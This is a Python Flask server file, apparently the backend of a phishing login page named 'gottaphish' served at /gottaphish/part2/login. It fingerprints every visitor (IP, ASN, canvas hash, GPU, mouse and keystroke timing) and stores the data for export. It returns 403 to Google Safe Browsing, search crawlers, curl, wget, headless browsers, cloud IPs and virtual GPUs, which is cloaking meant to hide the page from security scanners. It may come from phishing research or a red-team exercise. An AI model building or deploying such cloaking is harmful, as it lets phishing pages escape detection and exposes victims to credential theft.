import csv
import logging
import os
import re
import sqlite3
import threading
from bot_detection import (
    reverse_dns_check, is_cloud_ip, is_datacenter_asn,
    get_asn_info, load_cloud_ranges
)
from datetime import datetime

from flask import Flask, g, jsonify, render_template, request, send_file

# ---------------------------------------------------------------------------
# Logging — verbose pour voir les détections dans les logs K8s / Docker
# ---------------------------------------------------------------------------
logging.basicConfig(
    level=logging.INFO,
    format="[%(asctime)s] %(levelname)s %(name)s — %(message)s",
    datefmt="%Y-%m-%d %H:%M:%S",
)
logger = logging.getLogger("gottaphish")

app = Flask(__name__)
DB_PATH = os.path.join(os.path.dirname(__file__), "data", "visitors.db")

BOT_UA_PATTERNS = [
    r"googlebot", r"google-safety", r"safebrowsing", r"google-read-aloud",
    r"bingbot", r"yandexbot", r"baiduspider", r"duckduckbot",
    r"facebookexternalhit", r"twitterbot", r"linkedinbot", r"slurp",
    r"ahrefsbot", r"semrushbot", r"mj12bot", r"dotbot", r"rogerbot",
    r"python-requests", r"go-http-client", r"curl", r"wget",
    r"httpx", r"libwww", r"scrapy", r"phantomjs", r"headlesschrome",
]

VIRTUAL_GPU = [
    "swiftshader", "llvmpipe", "virtualbox", "vmware",
    "parallels", "microsoft basic render", "softpipe",
]

# Seuils comportementaux
# Un bot n'interagit pas avec la page (0 mouvements, 0 scroll)
# Un vrai user a toujours au moins quelques events
BOT_BEHAVIOR_THRESHOLDS = {
    "gpu_benchmark_ms_min": 100,  # en dessous = vrai GPU accéléré
    "gpu_benchmark_ms_max": 5000, # au dessus = VM très lente
}

def get_db():
    if "db" not in g:
        g.db = sqlite3.connect(DB_PATH)
        g.db.row_factory = sqlite3.Row
    return g.db

@app.teardown_appcontext
def close_db(_):
    db = g.pop("db", None)
    if db:
        db.close()

def init_db():
    os.makedirs(os.path.dirname(DB_PATH), exist_ok=True)
    with sqlite3.connect(DB_PATH) as conn:
        conn.execute("""
            CREATE TABLE IF NOT EXISTS visitors (
                id                   INTEGER PRIMARY KEY AUTOINCREMENT,
                ip                   TEXT,
                user_agent           TEXT,
                accept_language      TEXT,
                js_enabled           INTEGER DEFAULT 0,
                fp_id                TEXT,
                canvas_hash          TEXT,
                webgl_vendor         TEXT,
                webgl_renderer       TEXT,
                webgl_supported      INTEGER DEFAULT 0,
                webgl_benchmark_ms   INTEGER DEFAULT 0,
                webgpu_supported     INTEGER DEFAULT 0,
                screen               TEXT,
                timezone             TEXT,
                language             TEXT,
                platform             TEXT,
                hw_concurrency       INTEGER,
                device_memory        REAL,
                plugins_count        INTEGER,
                js_exec_time_ms      INTEGER,
                tls_cipher           TEXT,
                timestamp            TEXT,
                asn                  TEXT,
                asn_org              TEXT,
                mouse_moves          INTEGER DEFAULT 0,
                mouse_speed          INTEGER DEFAULT 0,
                scroll_events        INTEGER DEFAULT 0,
                click_x              INTEGER,
                click_y              INTEGER,
                avg_key_interval_ms  INTEGER DEFAULT 0,
                hesitations          INTEGER DEFAULT 0,
                first_interaction_ms INTEGER,
                is_bot               INTEGER DEFAULT 0,
                bot_reason           TEXT
            )
        """)
        # Migration pour tables existantes
        new_cols = [
            ("webgl_benchmark_ms",   "INTEGER DEFAULT 0"),
            ("asn",                  "TEXT"),
            ("asn_org",              "TEXT"),
            ("mouse_moves",          "INTEGER DEFAULT 0"),
            ("mouse_speed",          "INTEGER DEFAULT 0"),
            ("scroll_events",        "INTEGER DEFAULT 0"),
            ("click_x",              "INTEGER"),
            ("click_y",              "INTEGER"),
            ("avg_key_interval_ms",  "INTEGER DEFAULT 0"),
            ("hesitations",          "INTEGER DEFAULT 0"),
            ("first_interaction_ms", "INTEGER"),
        ]
        for col, coltype in new_cols:
            try:
                conn.execute(f"ALTER TABLE visitors ADD COLUMN {col} {coltype}")
            except Exception:
                pass
        conn.commit()


# ---------------------------------------------------------------------------
# Bot detection
# ---------------------------------------------------------------------------

def detect_bot_early(ip: str, ua: str) -> tuple[bool, str, str, str]:
    """GET / — only IP + UA available"""
    is_bot, reason = reverse_dns_check(ip)
    if is_bot:
        info = get_asn_info(ip)
        return True, reason, info.get("asn", ""), info.get("org", "")

    dc, asn, org = is_datacenter_asn(ip)
    if dc:
        return True, f"datacenter ASN: {org} ({asn})", asn, org

    is_bot, reason = is_cloud_ip(ip)
    if is_bot:
        info = get_asn_info(ip)
        return True, reason, info.get("asn", ""), info.get("org", "")

    lower = ua.lower()
    for p in BOT_UA_PATTERNS:
        if re.search(p, lower):
            info = get_asn_info(ip)
            return True, f"obvious bot UA: {p}", info.get("asn", ""), info.get("org", "")

    info = get_asn_info(ip)
    return False, "", info.get("asn", ""), info.get("org", "")


def detect_bot_full(row: dict) -> tuple[bool, str]:
    """POST /api/collect — full fingerprint available.

    Utilise UNIQUEMENT des indicateurs fiables (hard signals) pour bloquer :
      - IP / ASN / reverse DNS  (impossible à falsifier)
      - UA évidentes
      - Absence de JS / WebGL
      - GPU virtuel (swiftshader, llvmpipe …)
      - GPU benchmark extrêmement lent (VM)
      - JS exec anormalement rapide (headless)
      - hw_concurrency = 0 (VM)

    Les signaux comportementaux (mouse, scroll, clavier) sont collectés
    pour l'analyse statistique mais NE BLOQUENT PAS — ils peuvent être
    facilement falsifiés par les bots et absents chez les vrais utilisateurs
    mobiles/tablettes.
    """
    ip = row.get("ip", "")
    ua = row.get("user_agent", "")

    is_bot, reason, _, _ = detect_bot_early(ip, ua)
    if is_bot:
        return True, reason

    if not row.get("js_enabled"):
        return True, "no JS executed"

    if not row.get("webgl_supported"):
        return True, "no WebGL / no GPU"

    renderer = (row.get("webgl_renderer") or "").lower()
    for hint in VIRTUAL_GPU:
        if hint in renderer:
            return True, f"virtual GPU: {hint}"

    # GPU benchmark — VM très lente
    bms = row.get("webgl_benchmark_ms", 0)
    if isinstance(bms, (int, float)) and bms > BOT_BEHAVIOR_THRESHOLDS["gpu_benchmark_ms_max"]:
        return True, f"GPU benchmark too slow: {bms}ms (VM suspected)"

    t = row.get("js_exec_time_ms")
    if isinstance(t, (int, float)) and 0 < t < 5:
        return True, f"JS exec too fast ({t}ms)"

    if row.get("hw_concurrency") == 0:
        return True, "hw_concurrency=0"

    # Signaux comportementaux — enregistrés dans la DB pour analyse,
    # mais PAS utilisés pour le blocage (trop de faux positifs).
    return False, ""


# ---------------------------------------------------------------------------
# Routes
# ---------------------------------------------------------------------------

BASE = "/gottaphish/part2/login"


BLOCKED_HTML = """<!DOCTYPE html>
<html><head><title>403</title></head>
<body style="font-family:sans-serif;display:flex;align-items:center;
justify-content:center;min-height:100vh;background:#f5f5f4">
<div style="text-align:center"><h1>403 — Access Denied</h1>
<p>Your request has been blocked.</p></div></body></html>"""


@app.route(f"{BASE}/")
def index():
    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    ua = request.headers.get("User-Agent", "")
    accept_lang = request.headers.get("Accept-Language", "")
    tls_cipher = request.environ.get("SSL_CIPHER", "")
    ts = datetime.utcnow().isoformat()

    is_bot, bot_reason, asn, asn_org = detect_bot_early(ip, ua)

    db = get_db()
    cur = db.execute("""
        INSERT INTO visitors
            (ip, user_agent, accept_language, tls_cipher, js_enabled,
             timestamp, asn, asn_org, is_bot, bot_reason)
        VALUES (?, ?, ?, ?, 0, ?, ?, ?, ?, ?)
    """, (ip, ua, accept_lang, tls_cipher, ts, asn, asn_org, int(is_bot), bot_reason))
    db.commit()

    # ── BLOCAGE : bot détecté sur la base d'indicateurs fiables ──
    if is_bot:
        logger.warning(
            "[BLOCKED] ip=%s reason=%s asn=%s org=%s ua=%s",
            ip, bot_reason, asn, asn_org, ua,
        )
        return BLOCKED_HTML, 403

    logger.info("[ALLOWED] ip=%s asn=%s org=%s", ip, asn, asn_org)
    return render_template("index.html", visitor_id=cur.lastrowid)


@app.route(f"{BASE}/api/collect", methods=["POST"])
def collect():
    data = request.get_json(silent=True) or {}
    visitor_id = data.get("visitor_id")
    if not visitor_id:
        return jsonify({"error": "missing visitor_id"}), 400

    db = get_db()
    existing = db.execute("SELECT ip FROM visitors WHERE id = ?", (visitor_id,)).fetchone()
    ip = existing["ip"] if existing else request.headers.get("X-Forwarded-For", request.remote_addr)

    row = {
        "ip":                   ip,
        "user_agent":           request.headers.get("User-Agent", ""),
        "js_enabled":           1,
        "fp_id":                data.get("fp_id", ""),
        "canvas_hash":          data.get("canvas_hash", ""),
        "webgl_vendor":         data.get("webgl_vendor", ""),
        "webgl_renderer":       data.get("webgl_renderer", ""),
        "webgl_supported":      int(bool(data.get("webgl_supported"))),
        "webgl_benchmark_ms":   data.get("webgl_benchmark_ms", 0),
        "webgpu_supported":     int(bool(data.get("webgpu_supported"))),
        "screen":               data.get("screen", ""),
        "timezone":             data.get("timezone", ""),
        "language":             data.get("language", ""),
        "platform":             data.get("platform", ""),
        "hw_concurrency":       data.get("hw_concurrency", 0),
        "device_memory":        data.get("device_memory", 0),
        "plugins_count":        data.get("plugins_count", 0),
        "js_exec_time_ms":      data.get("js_exec_time_ms", 0),
        "mouse_moves":          data.get("mouse_moves", 0),
        "mouse_speed":          data.get("mouse_speed", 0),
        "scroll_events":        data.get("scroll_events", 0),
        "click_x":              data.get("click_x"),
        "click_y":              data.get("click_y"),
        "avg_key_interval_ms":  data.get("avg_key_interval_ms", 0),
        "hesitations":          data.get("hesitations", 0),
        "first_interaction_ms": data.get("first_interaction_ms"),
    }

    is_bot, bot_reason = detect_bot_full(row)

    db.execute("""
        UPDATE visitors SET
            js_enabled = 1, fp_id = ?, canvas_hash = ?,
            webgl_vendor = ?, webgl_renderer = ?,
            webgl_supported = ?, webgl_benchmark_ms = ?,
            webgpu_supported = ?,
            screen = ?, timezone = ?, language = ?, platform = ?,
            hw_concurrency = ?, device_memory = ?,
            plugins_count = ?, js_exec_time_ms = ?,
            mouse_moves = ?, mouse_speed = ?, scroll_events = ?,
            click_x = ?, click_y = ?,
            avg_key_interval_ms = ?, hesitations = ?,
            first_interaction_ms = ?,
            is_bot = ?, bot_reason = ?
        WHERE id = ?
    """, (
        row["fp_id"], row["canvas_hash"],
        row["webgl_vendor"], row["webgl_renderer"],
        row["webgl_supported"], row["webgl_benchmark_ms"],
        row["webgpu_supported"],
        row["screen"], row["timezone"], row["language"], row["platform"],
        row["hw_concurrency"], row["device_memory"],
        row["plugins_count"], row["js_exec_time_ms"],
        row["mouse_moves"], row["mouse_speed"], row["scroll_events"],
        row["click_x"], row["click_y"],
        row["avg_key_interval_ms"], row["hesitations"],
        row["first_interaction_ms"],
        int(is_bot), bot_reason, visitor_id
    ))
    db.commit()

    if is_bot:
        logger.warning(
            "[BLOCKED] ip=%s reason=%s renderer=%s benchmark=%sms",
            ip, bot_reason,
            row.get("webgl_renderer", ""), row.get("webgl_benchmark_ms", ""),
        )
        return jsonify({"status": "blocked", "is_bot": True}), 403

    logger.info(
        "[OK] ip=%s gpu=%s benchmark=%sms mouse=%s scroll=%s",
        ip, row.get("webgl_renderer", ""), row.get("webgl_benchmark_ms", ""),
        row.get("mouse_moves", 0), row.get("scroll_events", 0),
    )
    return jsonify({"status": "ok", "is_bot": False})


@app.route(f"{BASE}/api/stats")
def stats():
    db = get_db()
    def count(where=""):
        q = "SELECT COUNT(*) FROM visitors" + (f" WHERE {where}" if where else "")
        return db.execute(q).fetchone()[0]
    return jsonify({
        "total":          count(),
        "bots":           count("is_bot=1"),
        "humans":         count("is_bot=0 AND js_enabled=1"),
        "no_js":          count("js_enabled=0 AND is_bot=0"),
        "datacenter":     count("bot_reason LIKE '%datacenter ASN%'"),
        "virtual_gpu":    count("bot_reason LIKE '%GPU%'"),
        "no_interaction": count("bot_reason LIKE '%no human interaction%'"),
        "gpu_slow":       count("bot_reason LIKE '%GPU benchmark too slow%'"),
    })


@app.route(f"{BASE}/api/export")
def export_csv():
    db = get_db()
    rows = db.execute("SELECT * FROM visitors ORDER BY id DESC").fetchall()
    path = os.path.join(os.path.dirname(__file__), "data", "export.csv")
    with open(path, "w", newline="") as f:
        w = csv.writer(f)
        w.writerow([
            "id", "ip", "user_agent", "accept_language",
            "js_enabled", "fp_id", "canvas_hash",
            "webgl_vendor", "webgl_renderer", "webgl_supported", "webgl_benchmark_ms",
            "webgpu_supported", "screen", "timezone", "language",
            "platform", "hw_concurrency", "device_memory",
            "plugins_count", "js_exec_time_ms", "tls_cipher",
            "timestamp", "asn", "asn_org",
            "mouse_moves", "mouse_speed", "scroll_events",
            "click_x", "click_y", "avg_key_interval_ms",
            "hesitations", "first_interaction_ms",
            "is_bot", "bot_reason"
        ])
        for row in rows:
            w.writerow(list(row))
    return send_file(path, mimetype="text/csv", as_attachment=True,
                     download_name="visitors_export.csv")


# ---------------------------------------------------------------------------

init_db()
threading.Thread(target=load_cloud_ranges, daemon=True).start()

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)